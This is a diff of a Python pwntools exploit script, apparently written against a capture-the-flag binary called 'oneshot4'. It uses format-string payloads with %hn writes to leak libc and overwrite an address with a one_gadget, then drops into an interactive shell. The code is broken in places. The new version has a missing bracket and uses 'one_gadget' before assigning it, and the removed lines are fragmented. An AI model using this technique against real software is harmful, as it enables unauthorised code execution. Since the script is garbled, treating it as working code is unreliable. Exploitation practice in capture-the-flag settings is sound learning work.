@@ -257,99 +257,34 @@ from pwn import *
 line=b''
 while True:
     p=process("./oneshot4")
-    p.recv(144 )
-p.sendline(
-b'%8x%8x%8x%8x%8x%8x%p%10x%hn%8x%8x%8x%8x%2hhx%p%8x%8x%8x%8x%8x%8x%8x%8x%
-line=p.recvline()
-two=
-int
-(line[
-0x74
-:
-0x78
-],
-16
-)
-if
-two==
-0x0130
-:
-break
-p.close()
-libc_base=
-int
-(line[
-0x30
-:
-0x3e
-],
-16
-)-
-0x270b3
+    p.recv(144)
+    p.sendline("%8x%8x%8x%8x%8x%8x%p%10x%hn%8x%8x%8x%8x%2hhx%p%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%8x%129x%hhn")
+    line=p.recvline()
+    two=int(line[0x74:0x78],16)
+    if two==0x0130:
+        break
+    p.close()
+    
+libc_base=int(line[0x30:0x3e,16)-0x270b3
 
 
 
-print
-(
-one_gadget:
-,
-hex
-(one_gadget))
 p.recvline()
-p.recv(
-144
-)
-payload=
-b'%p'
-*
-23
-+
-b'%65396x%hn'
-+
-b'%8x'
-*
-10
-+
-b'%'
-payload+=
-str
-((one_gadget&
-0xffff
-)-
-0x9a
-).encode(
-'utf-8'
-)
-payload+=
-b'x%hn%'
-payload+=
-str
-(
-0x10000
-+((one_gadget>>
-16
-)&
-0xffff
-)-((one_gadget)&
-0xffff
-)).encode(
-'utf-8'
-)
-payload+=
-b'x%hn\n'
-payload+=
-b'\x00'
-*(
-0x100
--
-len
-(payload))
+p.recv(144)
+
+payload=b'%p'*23+b'%65396x%hn'+b'%8x'*10+b'%'
+payload+=str((one_gadget&0xffff)-0x9a).encode('utf-8')
+payload+=b'x%hn%'
+payload+=str(0x10000+((one_gadget>>16)&0xffff)-((one_gadget)&0xffff)).encode('utf-8')
+payload+=b'x%hn\n'
+payload+=b'\x00'*(0x100-len(payload))
+
+
+one_gadget=libc_base+0xe6c81
+
 p.sendline(payload)
 p.recvline()
 p.interactive()
-
-
-
 
 
 ```
